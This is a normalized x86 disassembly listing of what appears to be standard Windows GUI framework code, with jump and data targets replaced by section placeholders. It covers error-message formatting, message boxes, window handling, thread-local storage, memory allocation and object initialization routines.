sete cl
dec cl
and ecx eax
mov [ esi + 0x20 ] cl
mov [ esi + 0x20 ] bl
jmp r-xdata
mov [ esi ] ebx
mov [ esi + 0x4 ] ebx
push 0xffffffff
lea eax [ ebp - 0x8 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40655e
mov ecx [ eax ]
mov [ esi ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x4 ] eax
jmp r-xdata
lea eax [ ebp - 0x8 ]
push eax
call sub_406444
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
mov [ esi + 0x10 ] eax
mov [ esi + 0x14 ] ecx
push 0xffffffff
lea eax [ ebp - 0x10 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40655e
mov ecx [ eax ]
mov [ esi + 0x10 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0x14 ] eax
jmp r-xdata
lea eax [ ebp - 0x10 ]
push eax
call sub_406444
test eax eax
je r-xdata
xor eax eax
xor ecx ecx
mov [ esi + 0x8 ] eax
mov [ esi + 0xc ] ecx
push 0xffffffff
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x20 ]
call sub_40655e
mov ecx [ eax ]
mov [ esi + 0x8 ] ecx
mov eax [ eax + 0x4 ]
mov [ esi + 0xc ] eax
jmp r-xdata
lea eax [ ebp - 0x18 ]
push eax
call sub_406444
test eax eax
je r-xdata
mov eax [ esi + 0x10 ]
or eax [ esi + 0x14 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esi ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x4 ] eax
mov eax [ esi ]
or eax [ esi + 0x4 ]
jne r-xdata
mov eax [ esi + 0x8 ]
mov [ esi + 0x10 ] eax
mov eax [ esi + 0xc ]
mov [ esi + 0x14 ] eax
sub_406ba9
push ebp
sub esp 0x128
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x128 ] eax
push 0x8
mov eax sub_420d51
call sub_41021d
mov edi [ ebp + 0x134 ]
xor esi esi
mov [ ebp - 0x10 ] esi
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp ] esi
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x14 ] esi
call sub_406a50
mov ecx edi
call sub_405c49
mov eax 0x100
push eax
push eax
mov ecx edi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] 0x1
call sub_405c67
push eax
lea eax [ ebp + 0x22 ]
push eax
call sub_408390
push 0xffffffff
mov ecx edi
call sub_405aee
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x128 ]
xor ecx ebp
call sub_40f589
add ebp 0x12c
leave
retn 0x4
sub_406c52
push ebp
sub esp 0x128
lea ebp [ esp - 0x4 ]
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x128 ] eax
push 0x8
mov eax sub_420d51
call sub_41021d
mov edi [ ebp + 0x134 ]
xor esi esi
mov [ ebp - 0x10 ] esi
lea eax [ ebp ]
push eax
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x14 ] edi
mov [ ebp ] esi
mov [ ebp + 0x4 ] esi
mov [ ebp + 0x8 ] esi
mov [ ebp + 0xc ] esi
mov [ ebp + 0x10 ] esi
mov [ ebp + 0x14 ] esi
call sub_406a50
mov ecx edi
call sub_405c49
mov eax 0x100
push eax
push eax
mov ecx edi
mov [ ebp - 0x4 ] esi
mov [ ebp - 0x10 ] 0x1
call sub_405c67
push eax
lea eax [ ebp + 0x22 ]
push eax
call sub_405a3f
push 0xffffffff
mov ecx edi
call sub_405aee
mov eax edi
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp + 0x128 ]
xor ecx ebp
call sub_40f589
add ebp 0x12c
leave
retn 0x4
sub_406cfb
push ebp
lea ebp [ esp - 0xb0 ]
sub esp 0x130
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0xac ] eax
xor eax eax
push esi
mov esi [ ebp + 0xb8 ]
mov [ ebp - 0x80 ] eax
mov [ ebp - 0x7c ] eax
mov [ ebp - 0x78 ] eax
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] eax
lea eax [ ebp - 0x7c ]
push eax
call sub_406a50
lea eax [ ebp - 0x5a ]
push eax
mov ecx esi
call sub_40625f
mov ecx [ ebp + 0xac ]
mov eax esi
xor ecx ebp
pop esi
call sub_40f589
add ebp 0xb0
leave
retn 0x4
sub_406d9d
push 0x4
mov eax sub_420f3d
call sub_41021d
push 0xc
call sub_4053df
pop ecx
mov ecx eax
mov [ ebp - 0x10 ] ecx
xor eax eax
cmp ecx eax
mov [ ebp - 0x4 ] eax
je r-xdata
mov ecx [ ebp + 0x8 ]
or [ ebp - 0x4 ] 0xffffffff
mov [ eax + 0x8 ] ecx
mov [ ebp + 0x8 ] eax
push r--data
lea eax [ ebp + 0x8 ]
push eax
call sub_40fe0c
int3
call sub_406d87
sub_406de0
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
push ebx
xor ebx ebx
cmp eax ebx
je r-xdata
push ebx
push ebx
lea eax [ ebp + 0x10 ]
push eax
push 0x800
push [ ecx + 0x8 ]
push ebx
push 0x1100
call [ FormatMessageA@IAT ]
test eax eax
jne r-xdata
mov [ eax ] ebx
push 0xffffffff
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_405532
add esp 0x10
push [ ebp + 0x10 ]
call [ LocalFree@IAT ]
xor eax eax
inc eax
mov eax [ ebp + 0x8 ]
mov [ eax ] bl
xor eax eax
jmp r-xdata
pop ebx
pop ebp
retn 0xc
sub_406e57
push ebx
push esi
push edi
mov edi ecx
mov eax [ edi ]
mov esi [ eax - 0xc ]
lea ebx [ esi + 0x1 ]
push ebx
call sub_405c67
mov cl [ esp + 0x10 ]
mov [ eax + esi ] cl
push ebx
mov ecx edi
call sub_405776
pop edi
pop esi
pop ebx
retn 0x4
sub_406e7f
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov ebx ecx
mov eax [ ebx ]
push edi
mov edi [ eax - 0xc ]
sub esi eax
mov eax [ ebp + 0xc ]
add eax edi
push eax
mov [ ebp - 0x4 ] eax
call sub_405c67
cmp esi edi
ja r-xdata
mov esi [ ebp + 0x8 ]
add esi eax
jmp r-xdata
push [ ebp + 0xc ]
add eax edi
push esi
push [ ebp + 0xc ]
push eax
call sub_4105fc
add esp 0x10
push [ ebp - 0x4 ]
mov ecx ebx
call sub_405776
pop edi
pop esi
pop ebx
leave
retn 0x8
sub_406ece
push esi
mov esi [ esp + 0x8 ]
test esi esi
push edi
mov edi ecx
jne r-xdata
push esi
call sub_4108e0
pop ecx
xor eax eax
jmp r-xdata
push eax
push esi
mov ecx edi
call sub_406e7f
pop edi
pop esi
retn 0x4
sub_406f25
push 0x14
push r--data
call sub_4106dc
xor ebx ebx
mov [ ebp - 0x20 ] ebx
lea eax [ ebp - 0x20 ]
push eax
call sub_407eab
push [ eax + 0x80 ]
call sub_4077d7
mov [ ebp - 0x24 ] eax
mov [ ebp - 0x1c ] ebx
cmp eax ebx
jne r-xdata
mov [ ebp - 0x4 ] ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ MessageBoxA@IAT ]
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_406f87
mov eax [ ebp - 0x1c ]
xor eax eax
jmp r-xdata
call sub_410721
retn
sub_406f87
cmp [ ebp - 0x24 ] 0x2
je r-xdata
retn
xor eax eax
cmp [ ebp - 0x1c ] ebx
sete al
mov esi eax
cmp esi ebx
je r-xdata
xor edi edi
call [ GetLastError@IAT ]
mov edi eax
jmp r-xdata
push edi
call [ SetLastError@IAT ]
push [ ebp - 0x20 ]
push ebx
call sub_4077c7
cmp esi ebx
je r-xdata
sub_406fcf
push esi
call sub_406fbc
mov esi eax
test esi esi
je r-xdata
pop esi
retn
mov eax [ esi ]
mov ecx esi
call [ eax + 0x120 ]
test eax eax
je r-xdata
lea eax [ esi + 0x80 ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ eax ]
push [ esp + 0x8 ]
mov edx [ eax ]
mov ecx eax
call [ edx + 0x64 ]
sub_407003
push ebx
mov ebx [ GetParent@IAT ]
push ebp
mov ebp [ esp + 0xc ]
test ebp ebp
push esi
push edi
mov esi ebp
jne r-xdata
push 0xfffffff0
push esi
call [ GetWindowLongA@IAT ]
test eax 0x40000000
je r-xdata
call sub_406f19
test eax eax
jne r-xdata
test esi esi
mov edi esi
mov eax esi
je r-xdata
push esi
call ebx
mov esi eax
mov esi [ eax + 0x20 ]
jmp r-xdata
call sub_406fbc
test eax eax
jne r-xdata
test ebp ebp
jne r-xdata
push eax
mov edi eax
call ebx
test eax eax
jne r-xdata
test esi esi
jne r-xdata
xor esi esi
jmp r-xdata
mov ebx [ esp + 0x18 ]
test ebx ebx
je r-xdata
test esi esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
pop ebx
retn 0x8
test edi edi
je r-xdata
push esi
call [ GetLastActivePopup@IAT ]
mov esi eax
and [ ebx ] 0x0
push edi
call [ IsWindowEnabled@IAT ]
test eax eax
je r-xdata
cmp edi esi
je r-xdata
push 0x0
push edi
mov [ ebx ] edi
call [ EnableWindow@IAT ]
jmp r-xdata
sub_4070a1
push ebp
lea ebp [ esp - 0x9c ]
sub esp 0x11c
mov eax [ rw-data ]
xor eax ebp
mov [ ebp + 0x98 ] eax
mov eax [ ebp + 0xa8 ]
push ebx
push esi
push edi
mov edi [ ebp + 0xa4 ]
xor esi esi
push esi
mov [ ebp - 0x80 ] eax
call sub_406fcf
pop ecx
lea eax [ ebp - 0x70 ]
push eax
push esi
call sub_407003
mov ebx eax
cmp ebx [ ebp - 0x70 ]
mov [ ebp - 0x7c ] ebx
je r-xdata
and [ ebp - 0x78 ] esi
lea eax [ ebp - 0x78 ]
push eax
push ebx
call [ GetWindowThreadProcessId@IAT ]
test ebx ebx
je r-xdata
push 0x1
push ebx
call [ EnableWindow@IAT ]
test edi edi
je r-xdata
call [ GetCurrentProcessId@IAT ]
cmp [ ebp - 0x78 ] eax
jne r-xdata
and [ ebp - 0x74 ] 0x0
test esi esi
je r-xdata
lea esi [ edi + 0x78 ]
push 0x0
push 0x0
push 0x376
push ebx
call [ SendMessageA@IAT ]
test eax eax
je r-xdata
test [ ebp + 0xac ] 0xf0
jne r-xdata
mov eax [ esi ]
mov [ ebp - 0x74 ] eax
mov eax [ ebp + 0xb0 ]
test eax eax
je r-xdata
mov esi eax
jmp r-xdata
test edi edi
mov [ ebp - 0x6c ] 0x0
je r-xdata
mov eax [ ebp + 0xac ]
and eax 0xf
cmp eax 0x1
jbe r-xdata
add eax 0x30000
mov [ esi ] eax
lea ebx [ ebp - 0x6c ]
mov edi 0x104
push edi
mov eax ebx
push eax
push 0x0
call [ GetModuleFileNameA@IAT ]
cmp eax edi
jne r-xdata
mov ebx [ edi + 0x50 ]
jmp r-xdata
or [ ebp + 0xac ] 0x30
add eax 0xfffffffd
cmp eax 0x1
ja r-xdata
push [ ebp + 0xac ]
push ebx
push [ ebp - 0x80 ]
push [ ebp - 0x7c ]
call sub_406f25
add esp 0x10
test esi esi
mov edi eax
je r-xdata
mov [ ebp + 0x97 ] 0x0
or [ ebp + 0xac ] 0x20
jmp r-xdata
cmp [ ebp - 0x70 ] 0x0
je r-xdata
mov eax [ ebp - 0x74 ]
mov [ esi ] eax
push 0x1
call sub_406fcf
pop ecx
mov ecx [ ebp + 0x98 ]
mov eax edi
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_40f589
add ebp 0x9c
leave
retn
push 0x1
push [ ebp - 0x70 ]
call [ EnableWindow@IAT ]
sub_4071fc
push ebp
mov ebp esp
call sub_407eab
mov eax [ eax + 0x4 ]
test eax eax
je r-xdata
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push 0x0
call sub_4070a1
add esp 0x10
pop ebp
retn 0xc
mov edx [ eax ]
mov ecx eax
pop ebp
jmp [ edx + 0x98 ]
sub_40722d
push 0x4
mov eax sub_420e13
call sub_41021d
call sub_4082df
push eax
lea ecx [ ebp - 0x10 ]
call sub_405b13
push [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
lea ecx [ ebp - 0x10 ]
call sub_405ea0
mov eax [ ebp + 0x10 ]
cmp eax 0xffffffff
jne r-xdata
mov esi [ ebp - 0x10 ]
push eax
push [ ebp + 0xc ]
push esi
call sub_4071fc
lea ecx [ esi - 0x10 ]
mov edi eax
call sub_4056ce
mov eax edi
call sub_4102bc
retn 0xc
mov eax [ ebp + 0x8 ]
sub_407282
push ebx
push esi
mov esi [ esp + 0x10 ]
xor ebx ebx
cmp esi ebx
push edi
je r-xdata
call sub_4054e9
mov edi [ esp + 0x18 ]
cmp edi ebx
je r-xdata
call sub_407eab
mov eax [ eax + 0xc ]
push [ esp + 0x10 ]
push eax
call sub_40569f
cmp eax ebx
pop ecx
pop ecx
jne r-xdata
movzx ecx [ eax ]
push ebx
push ebx
dec edi
push edi
push esi
push ecx
add eax 0x2
push eax
push ebx
push ebx
call [ WideCharToMultiByte@IAT ]
mov [ eax + esi ] bl
jmp r-xdata
mov [ esi ] bl
xor eax eax
pop edi
pop esi
pop ebx
retn 0xc
sub_40730c
push ebx
push esi
mov esi ecx
push edi
lea ebx [ esi + 0x1c ]
push ebx
call [ EnterCriticalSection@IAT ]
mov edi [ esp + 0x10 ]
test edi edi
jle r-xdata
push ebx
call [ LeaveCriticalSection@IAT ]
xor eax eax
cmp edi [ esi + 0xc ]
jge r-xdata
push [ esi ]
call [ TlsGetValue@IAT ]
test eax eax
je r-xdata
cmp edi [ eax + 0x8 ]
jge r-xdata
mov eax [ eax + 0xc ]
mov edi [ eax + edi * 4 ]
push ebx
call [ LeaveCriticalSection@IAT ]
mov eax edi
jmp r-xdata
pop edi
pop esi
pop ebx
retn 0x4
sub_407359
push 0x8
mov eax sub_420d79
call sub_410250
mov esi ecx
mov eax [ esi ]
test eax eax
jne r-xdata
mov eax [ esi ]
call sub_4102bc
retn 0x4
push 0x10
call sub_4086ff
mov eax [ esi ]
and [ ebp - 0x4 ] 0x0
test eax eax
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push 0x10
call sub_40876c
call [ ebp + 0x8 ]
mov [ esi ] eax
sub_4073a9
push ebp
mov ebp esp
push ecx
mov eax [ ecx ]
test eax eax
je r-xdata
leave
retn
mov eax [ ecx ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
mov ecx [ ebp - 0x4 ]
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4073ff
push ecx
push ebx
push ebp
push esi
mov esi ecx
lea eax [ esi + 0x1c ]
push edi
push eax
mov [ esp + 0x14 ] eax
call [ EnterCriticalSection@IAT ]
mov eax [ esi + 0x4 ]
mov edi [ esi + 0x8 ]
cmp edi eax
jge r-xdata
xor edi edi
inc edi
cmp eax edi
jle r-xdata
mov ecx [ esi + 0x10 ]
test [ ecx + edi * 8 ] 0x1
je r-xdata
lea ebp [ eax + 0x20 ]
mov eax [ esi + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ esi + 0x10 ]
add ecx 0x8
cmp edi [ esi + 0xc ]
jl r-xdata
push eax
call [ GlobalHandle@IAT ]
mov ebx eax
push ebx
call [ GlobalUnlock@IAT ]
push 0x2002
push 0x8
push ebp
call sub_4053a0
pop ecx
pop ecx
push eax
push ebx
call [ GlobalReAlloc@IAT ]
push 0x8
push ebp
call sub_4053a0
pop ecx
pop ecx
push eax
push 0x2
call [ GlobalAlloc@IAT ]
jmp r-xdata
cmp edi eax
jl r-xdata
inc edi
add ecx 0x8
cmp edi eax
jl r-xdata
mov eax [ esi + 0x10 ]
push [ esp + 0x10 ]
lea eax [ eax + edi * 8 ]
or [ eax ] 0x1
lea eax [ edi + 0x1 ]
mov [ esi + 0x8 ] eax
call [ LeaveCriticalSection@IAT ]
mov eax edi
pop edi
pop esi
pop ebp
pop ebx
pop ecx
retn
lea eax [ edi + 0x1 ]
mov [ esi + 0xc ] eax
push eax
call [ GlobalLock@IAT ]
mov ebx eax
mov eax [ esi + 0x4 ]
mov ecx ebp
sub ecx eax
shl ecx 0x3
push ecx
lea eax [ ebx + eax * 8 ]
push 0x0
push eax
call sub_4109d0
add esp 0xc
mov [ esi + 0x4 ] ebp
mov [ esi + 0x10 ] ebx
mov esi [ esi + 0x10 ]
test esi esi
je r-xdata
test eax eax
jne r-xdata
test [ ecx ] 0x1
je r-xdata
push [ esp + 0x10 ]
call [ LeaveCriticalSection@IAT ]
jmp sub_4054cf
push esi
call [ GlobalHandle@IAT ]
push eax
call [ GlobalLock@IAT ]
sub_40750f
xor eax eax
push esi
mov esi ecx
mov [ esi + 0x14 ] eax
mov [ esi + 0x18 ] 0x4
mov [ esi + 0x4 ] eax
mov [ esi + 0x8 ] 0x1
mov [ esi + 0xc ] eax
mov [ esi + 0x10 ] eax
call [ TlsAlloc@IAT ]
cmp eax 0xffffffff
mov [ esi ] eax
jne r-xdata
lea eax [ esi + 0x1c ]
push eax
call [ InitializeCriticalSection@IAT ]
mov eax esi
pop esi
retn
jmp sub_4054cf
sub_40754e
push ebp
mov ebp esp
push ecx
push ebx
mov ebx ecx
lea eax [ ebx + 0x1c ]
push edi
push eax
mov [ ebp - 0x4 ] eax
call [ EnterCriticalSection@IAT ]
mov edi [ ebp + 0x8 ]
test edi edi
jle r-xdata
pop edi
pop ebx
leave
retn 0x4
cmp edi [ ebx + 0xc ]
jge r-xdata
push esi
mov esi [ ebx + 0x14 ]
jmp r-xdata
test esi esi
jne r-xdata
cmp edi [ esi + 0x8 ]
jge r-xdata
mov eax [ ebx + 0x10 ]
push [ ebp - 0x4 ]
lea eax [ eax + edi * 8 ]
and [ eax ] 0xfffffffe
call [ LeaveCriticalSection@IAT ]
pop esi
mov esi [ esi + 0x4 ]
mov eax [ esi + 0xc ]
mov ecx [ eax + edi * 4 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0xc ]
and [ eax + edi * 4 ] 0x0
mov eax [ ecx ]
push 0x1
call [ eax ]
sub_4075b1
push 0x10
mov eax sub_420d94
call sub_410250
mov edi ecx
mov [ ebp - 0x18 ] edi
lea esi [ edi + 0x1c ]
push esi
mov [ ebp - 0x14 ] esi
call [ EnterCriticalSection@IAT ]
mov eax [ ebp + 0x8 ]
xor ebx ebx
cmp eax ebx
jle r-xdata
push esi
cmp eax [ edi + 0xc ]
jge r-xdata
push [ edi ]
call [ TlsGetValue@IAT ]
mov esi eax
cmp esi ebx
je r-xdata
push 0x10
mov [ ebp - 0x4 ] ebx
call sub_4072e4
cmp eax ebx
je r-xdata
mov ecx [ ebp + 0x8 ]
cmp ecx [ esi + 0x8 ]
jl r-xdata
xor esi esi
mov [ eax ] r--data
mov esi eax
jmp r-xdata
mov eax [ esi + 0xc ]
cmp eax ebx
je r-xdata
cmp [ ebp + 0xc ] ebx
je r-xdata
cmp [ esi + 0xc ] ebx
jne r-xdata
or [ ebp - 0x4 ] 0xffffffff
push esi
lea ecx [ edi + 0x14 ]
mov [ esi + 0x8 ] ebx
mov [ esi + 0xc ] ebx
call sub_4073e6
jmp r-xdata
push [ ebp - 0x14 ]
jmp r-xdata
cmp ecx [ esi + 0x8 ]
jge r-xdata
push 0x2
push 0x4
push [ edi + 0xc ]
call sub_4053a0
pop ecx
pop ecx
push eax
push [ esi + 0xc ]
call [ LocalReAlloc@IAT ]
push 0x4
push [ edi + 0xc ]
call sub_4053a0
pop ecx
pop ecx
push eax
push ebx
call [ LocalAlloc@IAT ]
jmp r-xdata
call [ LeaveCriticalSection@IAT ]
call sub_4102bc
retn 0x8
mov edx [ ebp + 0xc ]
mov [ eax + ecx * 4 ] edx
mov ecx [ esi + 0x8 ]
mov [ esi + 0xc ] eax
mov edx [ edi + 0xc ]
sub edx ecx
shl edx 0x2
push edx
lea eax [ eax + ecx * 4 ]
push ebx
push eax
call sub_4109d0
mov eax [ edi + 0xc ]
add esp 0xc
push esi
mov [ esi + 0x8 ] eax
push [ edi ]
call [ TlsSetValue@IAT ]
mov ecx [ ebp + 0x8 ]
push [ ebp - 0x14 ]
call [ LeaveCriticalSection@IAT ]
call sub_4054cf
cmp eax ebx
jne r-xdata
sub_4076fc
push 0x4
mov eax sub_420dbf
call sub_41021d
mov esi ecx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
jne r-xdata
cmp [ esi ] 0x0
jne r-xdata
call sub_4054e9
push [ esi ]
mov ecx [ rw-data ]
call sub_40730c
mov edi eax
test edi edi
jne r-xdata
mov ecx [ rw-data ]
test ecx ecx
jne r-xdata
mov eax edi
call sub_4102bc
retn 0x4
call [ ebp + 0x8 ]
mov ecx [ rw-data ]
mov edi eax
push edi
push [ esi ]
call sub_4075b1
call sub_4073ff
test eax eax
mov [ esi ] eax
je r-xdata
mov ecx rw-data
mov [ ebp - 0x10 ] ecx
and [ ebp - 0x4 ] 0x0
call sub_40750f
or [ ebp - 0x4 ] 0xffffffff
test eax eax
mov ecx eax
mov [ rw-data ] ecx
je r-xdata
sub_407786
push esi
mov esi ecx
mov eax [ esi ]
test eax eax
je r-xdata
and [ esi ] 0x0
pop esi
retn
mov ecx [ rw-data ]
test ecx ecx
je r-xdata
push eax
call sub_40754e
sub_4077d7
cmp [ esp + 0x8 ] 0x0
jne r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_4054e9
push 0x2
pop eax
push [ esp + 0x8 ]
push [ esp + 0x8 ]
call sub_4077b7
neg eax
sbb eax eax
neg eax
jmp r-xdata
retn 0x8
sub_407820
push esi
mov esi ecx
mov eax [ esi + 0x2c ]
test eax eax
push edi
mov edi [ UnhookWindowsHookEx@IAT ]
mov [ esi ] r--data
je r-xdata
mov eax [ esi + 0x28 ]
test eax eax
je r-xdata
push eax
call edi
mov esi [ esi + 0xc ]
test esi esi
je r-xdata
push eax
call edi
pop edi
pop esi
retn
push esi
call sub_40f613
pop ecx
sub_407855
push esi
mov esi ecx
mov ecx [ esi + 0x3c ]
test ecx ecx
push edi
mov [ esi ] r--data
je r-xdata
push [ esi + 0x48 ]
call j_sub_40f613
xor edi edi
pop ecx
mov ecx [ esi + 0x14 ]
inc edi
test ecx ecx
je r-xdata
mov eax [ ecx ]
call [ eax + 0x13c ]
mov ecx [ esi + 0x18 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x1c ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x20 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x24 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov eax [ esi + 0x38 ]
test eax eax
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov ecx [ esi + 0x30 ]
test ecx ecx
je r-xdata
jmp r-xdata
mov ecx [ esi + 0x34 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
cmp [ eax + 0xc ] 0x0
jne r-xdata
mov ecx [ esi + 0x38 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
mov ecx [ esi + 0x38 ]
call sub_408aea
push eax
call j_sub_40f613
mov eax [ esi + 0x38 ]
pop ecx
pop edi
pop esi
retn
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
sub_40798f
push 0x4
mov eax sub_420df0
call sub_41021d
mov esi ecx
mov [ ebp - 0x10 ] esi
mov [ esi ] r--data
mov ecx [ esi + 0x48 ]
xor edi edi
inc edi
test ecx ecx
mov [ ebp - 0x4 ] edi
je r-xdata
mov ecx [ esi + 0x70 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov eax [ esi + 0x78 ]
mov ecx [ eax ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
lea edx [ esi + 0x4c ]
push edx
call [ eax + 0xc ]
mov ecx [ esi + 0x70 ]
test ecx ecx
je r-xdata
mov eax [ esi + 0x78 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
mov eax [ ecx ]
push edi
call [ eax + 0x4 ]
push [ esi + 0x78 ]
call j_sub_40f613
lea edi [ esi + 0x80 ]
mov eax [ edi ]
test eax eax
pop ecx
je r-xdata
mov eax [ ecx ]
push edi
call [ eax ]
lea ecx [ esi + 0x74 ]
mov [ ebp - 0x4 ] 0x0
call sub_407786
mov ecx [ esi + 0x34 ]
sub ecx 0x10
call sub_4056ce
call sub_4102bc
retn
cmp eax 0xffffffff
je r-xdata
push eax
call sub_4077a9
or [ edi ] 0xffffffff
sub_407a8d
push 0x4
mov eax sub_420e13
call sub_41021d
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_40625f
lea eax [ ebp - 0x10 ]
xor edi edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_407a46
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_4056ce
mov [ esi ] r--data
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
mov [ esi + 0x38 ] edi
mov [ esi + 0x3c ] edi
mov [ esi + 0x40 ] edi
mov [ esi + 0x44 ] edi
mov [ esi + 0x48 ] edi
mov [ esi + 0x4c ] edi
mov [ esi + 0x50 ] edi
mov [ esi + 0x54 ] edi
mov [ esi + 0x58 ] edi
mov [ esi + 0x5c ] edi
mov [ esi + 0x60 ] edi
mov [ esi + 0x64 ] edi
mov [ esi + 0x68 ] edi
mov [ esi + 0x6c ] edi
mov [ esi + 0x70 ] edi
mov [ esi + 0x74 ] edi
mov [ esi + 0x78 ] edi
mov [ esi + 0x7c ] edi
mov [ esi + 0x80 ] edi
mov [ esi + 0x84 ] edi
mov [ esi + 0x88 ] edi
mov [ esi + 0x8c ] edi
mov [ esi + 0x90 ] edi
mov [ esi + 0x94 ] edi
mov [ esi + 0x98 ] edi
mov [ esi + 0x9c ] edi
mov [ esi + 0xa0 ] edi
mov [ esi + 0xa4 ] edi
mov [ esi + 0xa8 ] edi
mov [ esi + 0xac ] edi
mov [ esi + 0xb0 ] edi
mov [ esi + 0xb4 ] edi
mov [ esi + 0xb8 ] edi
mov [ esi + 0xbc ] edi
mov [ esi + 0xc0 ] edi
mov [ esi + 0xc4 ] edi
mov [ esi + 0xc8 ] edi
mov [ esi + 0xcc ] edi
mov [ esi + 0xd0 ] edi
mov [ esi + 0xd4 ] edi
mov [ esi + 0xd8 ] edi
mov [ esi + 0xdc ] edi
mov [ esi + 0xe0 ] edi
mov [ esi + 0xe4 ] edi
mov [ esi + 0xe8 ] edi
mov [ esi + 0xec ] edi
mov [ esi + 0xf0 ] edi
mov [ esi + 0xf4 ] edi
mov [ esi + 0xf8 ] edi
mov [ esi + 0xfc ] edi
mov [ esi + 0x100 ] edi
mov [ esi + 0x104 ] edi
mov [ esi + 0x108 ] edi
mov [ esi + 0x10c ] edi
mov [ esi + 0x110 ] edi
mov [ esi + 0x114 ] edi
mov [ esi + 0x118 ] edi
mov [ esi + 0x11c ] edi
mov [ esi + 0x120 ] edi
mov [ esi + 0x124 ] edi
mov [ esi + 0x128 ] edi
mov [ esi + 0x12c ] edi
mov [ esi + 0x130 ] edi
mov [ esi + 0x134 ] edi
mov [ esi + 0x138 ] edi
mov [ esi + 0x13c ] edi
mov [ esi + 0x140 ] edi
mov [ esi + 0x144 ] edi
mov [ esi + 0x148 ] edi
mov [ esi + 0x14c ] edi
mov [ esi + 0x150 ] edi
mov [ esi + 0x154 ] edi
mov [ esi + 0x158 ] edi
mov [ esi + 0x15c ] edi
mov [ esi + 0x160 ] edi
mov [ esi + 0x164 ] edi
mov [ esi + 0x168 ] edi
mov [ esi + 0x16c ] edi
mov [ esi + 0x170 ] edi
mov [ esi + 0x174 ] edi
mov [ esi + 0x178 ] edi
mov [ esi + 0x17c ] edi
mov [ esi + 0x180 ] edi
mov [ esi + 0x184 ] edi
mov eax esi
call sub_4102bc
retn
sub_407cb1
push 0x4
mov eax sub_420e13
call sub_41021d
mov esi ecx
push r--data
lea ecx [ ebp - 0x10 ]
call sub_40625f
lea eax [ ebp - 0x10 ]
xor edi edi
push eax
mov ecx esi
mov [ ebp - 0x4 ] edi
call sub_407a46
mov ecx [ ebp - 0x10 ]
add ecx 0xfffffff0
call sub_4056ce
mov [ esi ] r--data
mov [ esi + 0x10 ] edi
mov [ esi + 0x14 ] edi
mov [ esi + 0x18 ] edi
mov [ esi + 0x1c ] edi
mov [ esi + 0x20 ] edi
mov [ esi + 0x24 ] edi
mov [ esi + 0x28 ] edi
mov [ esi + 0x2c ] edi
mov [ esi + 0x30 ] edi
mov [ esi + 0x34 ] edi
